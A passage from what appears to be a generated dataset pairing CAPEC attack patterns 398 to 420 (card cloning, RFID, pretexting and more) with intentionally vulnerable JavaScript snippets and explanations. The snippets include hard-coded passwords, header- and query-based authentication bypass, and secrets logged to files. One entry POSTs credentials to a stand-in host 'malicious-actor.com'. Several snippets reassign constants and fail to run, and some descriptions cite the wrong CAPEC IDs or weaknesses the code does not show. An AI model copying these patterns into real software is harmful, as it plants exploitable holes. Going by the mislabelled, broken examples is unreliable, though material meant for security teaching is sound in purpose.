        "description": "This JavaScript code snippet demonstrates the cloning of a magnetic stripe card, embodying the main idea of CAPEC-111: Cloning Magnetic Strip Cards. The `MagStripeCard` class contains sensitive card data and includes a `clone` method, which allows the card to be duplicated (CWE-498: Cloneable Class Containing Sensitive Information). The `readCard` and `writeCard` functions simulate the reading and writing of card data, respectively. The example usage shows how an attacker could clone a card by reading its data and creating a new card with the same data. This represents the vulnerability of magstripe cards to unauthorized duplication."
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "const crypto = require('crypto');\n\n// Hard-coded cryptographic key (CWE-321)\nconst hardCodedKey = '1234567890abcdef';\n\n// Simulate magnetic strip card data\nconst cardData = [\n  { cardNumber: '1234567890123456', expiration: '12/23', cvv: '123' },\n  { cardNumber: '6543210987654321', expiration: '11/22', cvv: '321' }\n];\n\n// Function to encrypt card data using a broken cryptographic algorithm (CWE-327)\nfunction encryptCardData(data) {\n  const cipher = crypto.createCipher('aes-128-ecb', hardCodedKey);\n  let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\n// Function to simulate brute force attack by generating new card data (CWE-307)\nfunction bruteForceCardData() {\n  const newCardData = [];\n  for (let i = 0; i < 1000; i++) {\n    const cardNumber = Math.floor(Math.random() * 10000000000000000).toString().padStart(16, '0');\n    const expiration = `${Math.floor(Math.random() * 12 + 1).toString().padStart(2, '0')}/${Math.floor(Math.random() * 5 + 22).toString().padStart(2, '0')}`;\n    const cvv = Math.floor(Math.random() * 1000).toString().padStart(3, '0');\n    newCardData.push({ cardNumber, expiration, cvv });\n  }\n  return newCardData;\n}\n\n// Encrypt original card data\nconst encryptedCardData = cardData.map(encryptCardData);\nconsole.log('Encrypted Card Data:', encryptedCardData);\n\n// Generate new card data through brute force\nconst generatedCardData = bruteForceCardData();\nconsole.log('Generated Card Data:', generatedCardData);",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary can analyze and generate new magnetic strip card data, embodying the main idea of CAPEC-111. The code includes several related CWEs: it uses a hard-coded cryptographic key (CWE-321) and a broken cryptographic algorithm (CWE-327) to encrypt card data. It also simulates a brute force attack (CWE-307) by generating multiple new card data entries. The code highlights the vulnerabilities associated with improper cryptographic practices and the potential for unauthorized access through brute force attacks."
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "const rfidData = '1234567890ABCDEF'; // Simulated RFID data\n\nfunction cloneRFID(data) {\n  // CWE-1294: Insecure Security Identifier Mechanism\n  const securityIdentifier = data.slice(0, 4); // Insecurely extracting security identifier\n  \n  // CWE-1290: Incorrect Decoding of Security Identifiers\n  const decodedIdentifier = parseInt(securityIdentifier, 16); // Incorrect decoding\n  \n  // CWE-694: Use of Multiple Resources with Duplicate Identifier\n  const clonedData = data + data; // Duplicate identifier usage\n  \n  // CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n  // Simulating a fault injection vulnerability\n  if (Math.random() < 0.1) {\n    clonedData = 'FAULTY' + clonedData;\n  }\n  \n  // CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n  if (clonedData !== data) {\n    console.log('Behavioral discrepancy detected');\n  }\n  \n  return clonedData;\n}\n\nconst clonedRFID = cloneRFID(rfidData);\nconsole.log('Cloned RFID Data:', clonedRFID);",
        "description": "This JavaScript code snippet simulates the cloning of an RFID card by duplicating the RFID data. It embodies the main idea of CAPEC-170: 'Cloning RFID Cards or Chips'. The code demonstrates several related CWEs: CWE-1294 by insecurely extracting a security identifier, CWE-1290 by incorrectly decoding the security identifier, CWE-694 by using duplicate identifiers, CWE-1319 by simulating a fault injection vulnerability, and CWE-207 by detecting behavioral discrepancies. The function 'cloneRFID' takes RFID data, processes it insecurely, and returns a cloned version of the data, highlighting potential vulnerabilities in RFID systems."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "class RFIDChip {\n  constructor() {\n    this.active = true;\n    this.sensitiveData = 'Sensitive Information';\n  }\n\n  deactivateChip() {\n    if (this.checkDebugAccess()) {\n      this.active = false;\n      console.log('RFID Chip deactivated.');\n    } else {\n      console.log('Unauthorized access attempt detected.');\n    }\n  }\n\n  checkDebugAccess() {\n    // Improper access control simulation\n    return true; // Always returns true, simulating improper access control\n  }\n\n  injectError() {\n    if (this.active) {\n      console.log('Error injected, chip functionality degraded.');\n    }\n  }\n\n  disableAlerts() {\n    console.log('Alerts disabled.');\n  }\n\n  scrubSensitiveData() {\n    this.sensitiveData = null;\n    console.log('Sensitive data scrubbed.');\n  }\n}\n\nconst rfid = new RFIDChip();\nrfid.deactivateChip();\nrfid.injectError();\nrfid.disableAlerts();\nrfid.scrubSensitiveData();",
        "description": "This JavaScript code snippet represents the concept of 'RFID Chip Deactivation or Destruction' by simulating an RFID chip class with methods to deactivate the chip, inject errors, disable alerts, and scrub sensitive data. The 'deactivateChip' method demonstrates improper access control (CWE-1191) by always allowing deactivation. The 'injectError' method simulates error injection (CWE-1334) to degrade the chip's functionality. The 'disableAlerts' method represents disabling outbound error messages and alerts (CWE-1320). Finally, the 'scrubSensitiveData' method simulates the removal of sensitive data (CWE-1266). The code highlights vulnerabilities that could be exploited to deactivate or destroy an RFID chip without damaging the object housing it."
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "const fs = require('fs');\n\n// Simulate improper physical access control\nfunction readSensitiveFile(filePath) {\n  try {\n    const data = fs.readFileSync(filePath, 'utf8');\n    console.log('Sensitive Data:', data);\n  } catch (err) {\n    console.error('Error reading file:', err);\n  }\n}\n\n// Simulate improper restriction of software interfaces to hardware features\nfunction manipulateHardware() {\n  console.log('Accessing hardware registers...');\n  // Hypothetical function to manipulate hardware registers\n  // This would normally be restricted\n  // hardware.writeRegister('0x01', '0xFF');\n}\n\n// Simulate improper protection against voltage and clock glitches\nfunction induceGlitch() {\n  console.log('Inducing voltage glitch...');\n  // Hypothetical function to induce a voltage glitch\n  // This would normally be protected\n  // hardware.induceVoltageGlitch();\n}\n\n// Simulate activation of test/debug logic at runtime\nfunction activateDebugMode() {\n  console.log('Activating debug mode...');\n  // Hypothetical function to activate debug mode\n  // This would normally be restricted\n  // hardware.activateDebugMode();\n}\n\n// Simulate improper protection of physical side channels\nfunction observeSideChannel() {\n  console.log('Observing side channel emissions...');\n  // Hypothetical function to observe side channel emissions\n  // This would normally be protected\n  // hardware.observeSideChannel();\n}\n\n// Example usage\nreadSensitiveFile('/path/to/sensitive/file');\nmanipulateHardware();\ninduceGlitch();\nactivateDebugMode();\nobserveSideChannel();",
        "description": "This JavaScript code snippet simulates various vulnerabilities related to physically hacking hardware. The `readSensitiveFile` function demonstrates improper physical access control by reading a sensitive file without proper authorization. The `manipulateHardware` function represents improper restriction of software interfaces to hardware features by hypothetically accessing hardware registers. The `induceGlitch` function simulates improper protection against voltage and clock glitches. The `activateDebugMode` function shows how test or debug logic can be activated at runtime, potentially altering hardware behavior. Finally, the `observeSideChannel` function represents improper protection of physical side channels by observing emissions that could leak sensitive information. These functions collectively illustrate how an adversary could exploit these weaknesses to compromise hardware integrity."
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "const hardCodedPassword = 'defaultPassword';\n\nfunction authenticate(password) {\n  if (password === hardCodedPassword) {\n    return true;\n  }\n  return false;\n}\n\nfunction updatePassword(newPassword) {\n  // Improper Authorization: No check if the user is authenticated\n  hardCodedPassword = newPassword;\n  console.log('Password updated successfully');\n}\n\n// Simulate an unauthorized password update\nupdatePassword('newSecurePassword');\n\n// Attempt to authenticate with the new password\nif (authenticate('newSecurePassword')) {\n  console.log('Access granted');\n} else {\n  console.log('Access denied');\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an ATA password can be updated without proper authorization checks. The `authenticate` function checks if the provided password matches a hard-coded password. The `updatePassword` function allows updating the password without verifying if the user is authenticated, representing CWE-285 (Improper Authorization). The use of a hard-coded password (CWE-259) is also shown, which is a common security flaw. This snippet embodies the main idea of CAPEC-Bypassing ATA Password Security by illustrating how an attacker could exploit the lack of proper authorization to change the password and gain unauthorized access."
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const logData = `${new Date().toISOString()} - ${req.method} ${req.url} - ${req.headers['user-agent']}`;\n  fs.appendFile('server.log', logData + '\\n', (err) => {\n    if (err) throw err;\n  });\n\n  if (req.url === '/admin' && req.headers['x-auth-token'] !== 'securetoken') {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Forbidden');\n    return;\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Hello, world!');\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that logs incoming requests to a file named 'server.log'. The log includes the timestamp, HTTP method, URL, and user-agent header. The server also has a simple authentication check for accessing the '/admin' endpoint, where it verifies an 'x-auth-token' header. If the token is incorrect, it responds with a '403 Forbidden' status. This code embodies the deprecated CAPEC concept of 'Social Information Gathering Attacks' by demonstrating how sensitive information (like access tokens and user-agent strings) can be logged and potentially exposed through server log files (CWE-533). Additionally, it shows a basic authentication mechanism that could be bypassed if not implemented securely (CWE-592)."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const user = queryObject.user;\n\n  // Vulnerable: Logging sensitive information\n  console.log(`User login attempt: ${user}`);\n\n  // Vulnerable: Authentication bypass\n  if (user === 'admin') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome, admin!');\n  } else {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access denied');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It parses the URL to extract a 'user' query parameter and logs this information, which can expose sensitive data through server log files (related to deprecated CWE-533). Additionally, it contains a simplistic and insecure authentication check that grants access if the 'user' parameter is 'admin', representing an authentication bypass issue (related to deprecated CWE-592). This code embodies the main idea of the deprecated CAPEC by demonstrating how improper handling of sensitive information and weak authentication mechanisms can lead to security vulnerabilities."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "const fs = require('fs');\n\n// Simulate storing sensitive information in a file\nconst sensitiveData = 'User: admin\\nPassword: admin123';\nfs.writeFileSync('sensitive_info.txt', sensitiveData);\n\n// Simulate improper scrubbing of sensitive data\nfunction decommissionDevice() {\n  fs.unlinkSync('sensitive_info.txt'); // Simply deleting the file\n}\n\ndecommissionDevice();\n\n// Simulate exposure of version-control repository\nfs.writeFileSync('.git/config', '[core]\\nrepositoryformatversion = 0\\nfilemode = true\\nbare = false\\n');\n\n// Simulate cleartext transmission of sensitive information\nconst http = require('http');\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/login',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded',\n  },\n};\nconst req = http.request(options, (res) => {\n  res.on('data', (chunk) => {\n    console.log(`BODY: ${chunk}`);\n  });\n});\nreq.write('username=admin&password=admin123');\nreq.end();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Dumpster Diving' and associated CWEs. It simulates the storage of sensitive information in a file and then improperly scrubs it by simply deleting the file, which can be recovered from the trash or file system (CWE-1266). It also shows the exposure of a version-control repository by writing a .git/config file in an accessible directory (CWE-527). Additionally, it demonstrates the cleartext transmission of sensitive information over an HTTP request (CWE-319). These practices can lead to sensitive information being exposed to unauthorized actors, which is the main idea behind the 'Dumpster Diving' attack."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst session = require('express-session');\n\napp.use(session({\n  secret: 'secret-key',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false }\n}));\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  // Simulate user authentication\n  if (username === 'admin' && password === 'password') {\n    req.session.user = { username };\n    res.send('Logged in');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/sensitive-data', (req, res) => {\n  if (req.session.user) {\n    // Exposing sensitive information without proper authorization check\n    res.send('Sensitive Information: [REDACTED]');\n  } else {\n    res.send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js application that demonstrates the concept of pretexting and related CWEs. The application has a login endpoint that simulates user authentication and a session management system. However, it contains several vulnerabilities:\n\n1. **Session Fixation (CWE-384)**: The session is not invalidated upon login, allowing an attacker to hijack the session.\n2. **Channel Accessible by Non-Endpoint (CWE-300)**: The session cookie is not marked as secure, making it accessible over non-secure channels.\n3. **User Interface (UI) Misrepresentation of Critical Information (CWE-451)**: The application does not provide any UI feedback to indicate the security status of the session.\n4. **Exposure of Sensitive Information to an Unauthorized Actor (CWE-200)**: The `/sensitive-data` endpoint exposes sensitive information without proper authorization checks.\n\nThe code embodies the main idea of pretexting by simulating a scenario where an attacker could manipulate the session and access sensitive information by exploiting these vulnerabilities."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "const fs = require('fs');\n\n// Vulnerable code: Storing sensitive information in a log file\nfunction logSensitiveData(data) {\n  const logFile = 'server.log';\n  fs.appendFileSync(logFile, `Sensitive Data: ${data}\\n`);\n  console.log('Data logged successfully');\n}\n\n// Example usage\nlogSensitiveData('User password: 12345');",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to the deprecated CAPEC pattern 'Information Gathering from Traditional Sources' and the related CWEs. The function `logSensitiveData` writes sensitive information, such as a user's password, to a server log file. This is an example of CWE-532 (Information Exposure Through Log Files), which can lead to unauthorized access if the log files are not properly secured. The code highlights the risk of exposing sensitive data through improper logging practices."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "const fs = require('fs');\nconst dns = require('dns');\n\n// Vulnerable code: Reliance on DNS lookups in a security decision\nfunction isTrustedDomain(domain) {\n  dns.lookup(domain, (err, address) => {\n    if (err) throw err;\n    if (address === '192.168.1.1') {\n      console.log('Trusted domain');\n    } else {\n      console.log('Untrusted domain');\n    }\n  });\n}\n\n// Vulnerable code: Information exposure through log files\nfunction logDebugInfo(info) {\n  fs.appendFile('debug.log', info, (err) => {\n    if (err) throw err;\n    console.log('Debug info logged');\n  });\n}\n\n// Example usage\nisTrustedDomain('example.com');\nlogDebugInfo('User login attempt from IP: 192.168.1.100');",
        "description": "This JavaScript code snippet demonstrates two deprecated weaknesses related to the CAPEC description. The first function, `isTrustedDomain`, relies on DNS lookups to make a security decision, which is deprecated as CWE-247 and now covered under CWE-350. This can be exploited if DNS responses are spoofed. The second function, `logDebugInfo`, writes sensitive information to a debug log file, which is deprecated as CWE-534 and CWE-533, now covered under CWE-532. This can lead to information exposure if the log files are accessed by unauthorized users. The code represents the main idea of the CAPEC by showing how information can be gathered and exposed through non-traditional sources like DNS lookups and log files."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "const http = require('http');\nconst sensitiveData = 'Sensitive Information';\n\nhttp.createServer((req, res) => {\n  if (req.url === '/getInfo') {\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    if (req.headers['x-custom-header'] === 'trusted-source') {\n      // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(sensitiveData);\n    } else {\n      res.writeHead(403, {'Content-Type': 'text/plain'});\n      res.end('Forbidden');\n    }\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. When a request is made to the '/getInfo' endpoint, the server checks for a custom header 'x-custom-header' to verify the source of the request. If the header matches 'trusted-source', the server responds with sensitive information. Otherwise, it responds with a 'Forbidden' status. This code demonstrates CWE-940 (Improper Verification of Source of a Communication Channel) by using a simplistic and easily spoofable header check for source verification. It also demonstrates CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing sensitive information based on an inadequate verification mechanism. The main idea of the CAPEC (Information Elicitation) is represented by the server's behavior of disclosing sensitive information based on easily manipulated contextual information."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\n// Middleware to log requests\napp.use((req, res, next) => {\n  const log = `${new Date().toISOString()} - ${req.method} - ${req.url} - ${req.headers['user-agent']}`;\n  fs.appendFile('server.log', log + '\\n', (err) => {\n    if (err) throw err;\n  });\n  next();\n});\n\n// Route that simulates an authentication bypass vulnerability\napp.get('/admin', (req, res) => {\n  if (req.query.admin === 'true') {\n    res.send('Welcome, Admin!');\n  } else {\n    res.send('Access Denied');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server. It includes middleware to log incoming requests to a file named 'server.log', capturing details such as the request method, URL, and user-agent. This logging mechanism can lead to information exposure through server log files (CWE-532). Additionally, the '/admin' route simulates an authentication bypass vulnerability (CWE-287) by granting access based on a query parameter without proper authentication checks. The code embodies the main idea of CAPEC-407 by demonstrating how an attacker could gather information through pretexting and exploit weak authentication mechanisms."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\napp.use(express.json());\n\n// Simulated customer service endpoint\napp.post('/customer-service', (req, res) => {\n  const { customerId, creditCardNumber } = req.body;\n\n  // CWE-940: No verification of the source of the request\n  // CWE-300: No verification of the identity of the actor\n  // CWE-408: Performing an expensive operation before authentication\n  // CWE-200: Exposing sensitive information\n  if (!customerId || !creditCardNumber) {\n    return res.status(400).send('Missing customer information');\n  }\n\n  // Simulate a database lookup\n  const customerData = getCustomerData(customerId);\n\n  if (customerData) {\n    // CWE-925: No verification of the intent of the request\n    res.status(200).send(`Customer ${customerId} verified with credit card ending in ${creditCardNumber.slice(-4)}`);\n  } else {\n    res.status(404).send('Customer not found');\n  }\n});\n\nfunction getCustomerData(customerId) {\n  // Simulated database\n  const database = {\n    '12345': { name: 'John Doe', creditCardNumber: '1234-5678-9012-3456' }\n  };\n  return database[customerId];\n}\n\napp.listen(port, () => {\n  console.log(`Customer service app listening at http://localhost:${port}`);\n});",
        "description": "This JavaScript code snippet represents a vulnerable customer service endpoint using the Express framework. The endpoint '/customer-service' accepts POST requests with 'customerId' and 'creditCardNumber' in the body. The code demonstrates several security weaknesses: it does not verify the source of the request (CWE-940), does not verify the identity of the actor (CWE-300), performs an expensive operation (database lookup) before authentication (CWE-408), exposes sensitive information (CWE-200), and does not verify the intent of the request (CWE-925). This setup can be exploited by an adversary engaging in pretexting behavior to solicit sensitive information from the target."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Simulate tech support pretexting attack\nfunction techSupportPretexting(userInput) {\n  // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n  const sensitiveInfo = 'UserPassword123';\n  if (userInput === 'tech_support') {\n    console.log('Access granted to sensitive information:', sensitiveInfo);\n  }\n\n  // CWE-434: Unrestricted Upload of File with Dangerous Type\n  const uploadFile = (filePath) => {\n    const fileType = path.extname(filePath);\n    if (fileType === '.exe' || fileType === '.js') {\n      console.log('Dangerous file type uploaded:', filePath);\n    }\n  };\n  uploadFile('malicious_payload.exe');\n\n  // CWE-1263: Improper Physical Access Control\n  const physicalAccess = true;\n  if (physicalAccess) {\n    console.log('Physical access granted. Sensitive data compromised.');\n  }\n}\n\n// Simulate a call from tech support\ntechSupportPretexting('tech_support');",
        "description": "This JavaScript code snippet simulates a tech support pretexting attack, where an adversary impersonates a tech support worker to gain access to sensitive information and perform malicious actions. The function `techSupportPretexting` demonstrates three key weaknesses: CWE-200 (exposure of sensitive information), CWE-434 (unrestricted upload of dangerous files), and CWE-1263 (improper physical access control). The code checks if the user input matches 'tech_support' to grant access to sensitive information, simulates the upload of a dangerous file type, and logs a message indicating that physical access has been granted, compromising sensitive data. This represents the main idea of the CAPEC by illustrating how an adversary can exploit these weaknesses to achieve their goals."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\n// CWE-941: Incorrectly Specified Destination in a Communication Channel\nconst options = {\n  hostname: 'malicious-actor.com', // Incorrect destination\n  port: 80,\n  path: '/data',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log('Response:', data);\n  });\n});\n\n// CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\nconst sensitiveData = JSON.stringify({\n  username: 'admin',\n  password: 'password123'\n});\nfs.writeFileSync('/var/www/html/sensitiveData.json', sensitiveData); // Externally accessible directory\n\n// CWE-300: Channel Accessible by Non-Endpoint\nreq.write(sensitiveData); // Sending sensitive data over an insecure channel\nreq.end();\n\n// CWE-433: Unparsed Raw Web Content Delivery\nfs.writeFileSync('/var/www/html/rawContent.txt', '<script>alert(\"XSS\")</script>'); // Raw content under web root\n\n// CWE-1292: Incorrect Conversion of Security Identifiers\nconst securityMap = {\n  'admin': '1234',\n  'user': '5678'\n};\nconst convertSecurityId = (role) => {\n  return securityMap[role] || '0000'; // Incorrect conversion\n};\nconsole.log('Security ID for admin:', convertSecurityId('admin'));\nconsole.log('Security ID for guest:', convertSecurityId('guest')); // Untrusted agent access\n",
        "description": "This JavaScript code snippet demonstrates several security weaknesses that align with the CAPEC description of 'Pretexting via Delivery Person'. The code simulates a scenario where an adversary, posing as a delivery person, exploits various vulnerabilities to solicit sensitive information or manipulate the target.\n\n1. **CWE-941**: The code specifies an incorrect destination for an outgoing request, potentially sending sensitive data to a malicious actor.\n2. **CWE-538**: Sensitive information is written to an externally accessible directory, making it vulnerable to unauthorized access.\n3. **CWE-300**: Sensitive data is sent over an insecure communication channel, which could be intercepted by non-endpoint actors.\n4. **CWE-433**: Raw web content is stored under the web document root, which could be executed by a web server, leading to potential XSS attacks.\n5. **CWE-1292**: The code demonstrates an incorrect conversion of security identifiers, allowing untrusted agents to gain unauthorized access.\n\nOverall, the code snippet encapsulates the essence of the CAPEC by showing how an adversary can exploit these weaknesses to achieve their malicious goals."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  const { headers } = req;\n  const userRole = headers['x-user-role'];\n\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (userRole === 'admin') {\n    // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    res.end('Sensitive Information: Admin Password is 12345');\n  } else {\n    res.writeHead(403, { 'Content-Type': 'text/plain' });\n    res.end('Access Denied');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It checks the 'x-user-role' header to determine the user's role. If the role is 'admin', it exposes sensitive information (admin password) without properly verifying the source of the request (CWE-940). This represents a vulnerability where an attacker could impersonate an admin by manipulating the request headers, leading to the exposure of sensitive information (CWE-200). This scenario embodies the main idea of the CAPEC 'Pretexting via Phone', where an adversary assumes a trusted role to solicit information or manipulate actions."
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "const sensitiveData = 'UserPassword123';\n\nfunction handleRequest(userRole, requestData) {\n  if (userRole === 'admin') {\n    console.log('Admin access granted.');\n    return sensitiveData;\n  } else if (userRole === 'user') {\n    console.log('User access granted.');\n    if (requestData.includes('password')) {\n      console.log('Sensitive information request detected.');\n      return 'Access Denied';\n    }\n    return 'User data';\n  } else {\n    console.log('Unauthorized access attempt.');\n    return 'Access Denied';\n  }\n}\n\n// Simulating a social engineering attack\nconst attackerRole = 'user';\nconst attackerRequest = 'Can I get the password?';\nconsole.log(handleRequest(attackerRole, attackerRequest));",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker attempts to manipulate human behavior to gain access to sensitive information. The `handleRequest` function simulates a system handling requests based on user roles. If the user role is 'admin', sensitive data is returned. If the user role is 'user', the function checks if the request data includes the word 'password' and denies access if it does, otherwise, it returns non-sensitive user data. This represents the CAPEC idea of manipulating human behavior to solicit information. The code also touches on related CWEs: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing sensitive data, CWE-202 (Exposure of Sensitive Information Through Data Queries) by checking request content, and CWE-205 (Observable Behavioral Discrepancy) by logging different messages based on the role and request content."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "const users = { 'admin': 'password123' }; // CWE-656: Reliance on Security Through Obscurity\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    console.log('Authentication successful');\n    return true;\n  } else {\n    console.log('Authentication failed');\n    return false;\n  }\n}\n\nfunction performSensitiveAction(user) {\n  if (authenticate(user.username, user.password)) { // CWE-654: Reliance on a Single Factor in a Security Decision\n    console.log('Sensitive action performed');\n  } else {\n    console.log('Access denied');\n  }\n}\n\n// Simulating a social engineering attack\nconst attacker = { username: 'admin', password: 'password123' }; // Attacker gains knowledge of credentials through social engineering\nperformSensitiveAction(attacker);",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that relies on a single factor (username and password) for access control, embodying the CAPEC concept of 'Influence Perception' through social engineering. The code uses a hardcoded password (CWE-656: Reliance on Security Through Obscurity) and checks credentials in a straightforward manner (CWE-654: Reliance on a Single Factor in a Security Decision). An attacker, having obtained the credentials through social engineering, can successfully authenticate and perform a sensitive action, illustrating the vulnerability."
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  console.log(`Received request from ${clientIP}`);\n\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (clientIP === 'trusted-client-ip') {\n    // CWE-300: Channel Accessible by Non-Endpoint\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Hello, trusted client! You are awesome! Can you share your secret key?');\n  } else {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access denied');\n  }\n});\n\nserver.listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It logs the IP address of the client making the request and checks if the IP address matches a 'trusted' client IP. If the IP matches, the server responds with a message that includes a compliment and a request for sensitive information, embodying the CAPEC concept of 'Influence Perception of Reciprocation'. The code also demonstrates CWE-940 by not properly verifying the source of the communication channel, and CWE-300 by allowing a non-endpoint to access the channel. This setup can be exploited by an attacker to gain sensitive information from a target by creating a false sense of trust and obligation."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "const crypto = require('crypto');\n\nfunction negotiateAlgorithm(clientPreference) {\n  const serverAlgorithms = ['AES-256', 'AES-128'];\n  let selectedAlgorithm = 'AES-256'; // Default to the strongest algorithm\n\n  if (serverAlgorithms.includes(clientPreference)) {\n    selectedAlgorithm = clientPreference; // Downgrade if client prefers a weaker algorithm\n  }\n\n  return selectedAlgorithm;\n}\n\nfunction sendRequest(destination, data) {\n  const validDestinations = ['https://trustedserver.com', 'https://backupserver.com'];\n\n  if (!validDestinations.includes(destination)) {\n    console.error('Invalid destination specified!');\n    return;\n  }\n\n  // Simulate sending data\n  console.log(`Sending data to ${destination} using ${negotiateAlgorithm('AES-128')}`);\n}\n\nsendRequest('https://maliciousserver.com', { key: 'value' });",
        "description": "This JavaScript code snippet demonstrates a scenario where a server negotiates a less secure algorithm based on the client's preference, embodying CWE-757 (Algorithm Downgrade). Additionally, it attempts to send a request to an invalid destination, illustrating CWE-941 (Incorrectly Specified Destination in a Communication Channel). The `negotiateAlgorithm` function defaults to a strong algorithm but downgrades if the client prefers a weaker one. The `sendRequest` function checks if the destination is valid but ultimately fails to prevent sending data to an invalid destination, highlighting observable discrepancies (CWE-203) and potential behavioral discrepancies (CWE-205). This represents the deprecated CAPEC pattern of influencing target behavior through perceived concessions."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "const itemsInStock = 5;\n\nfunction checkStock(item) {\n  if (itemsInStock <= 0) {\n    console.log('Item is out of stock!');\n    return false;\n  }\n  return true;\n}\n\nfunction purchaseItem(item) {\n  if (checkStock(item)) {\n    console.log('Hurry! Only ' + itemsInStock + ' left in stock!');\n    // Simulate purchase process\n    console.log('Purchasing ' + item + '...');\n    // Decrement stock\n    itemsInStock--;\n  } else {\n    console.log('Cannot purchase ' + item + '.');\n  }\n}\n\n// Example usage\npurchaseItem('Widget');",
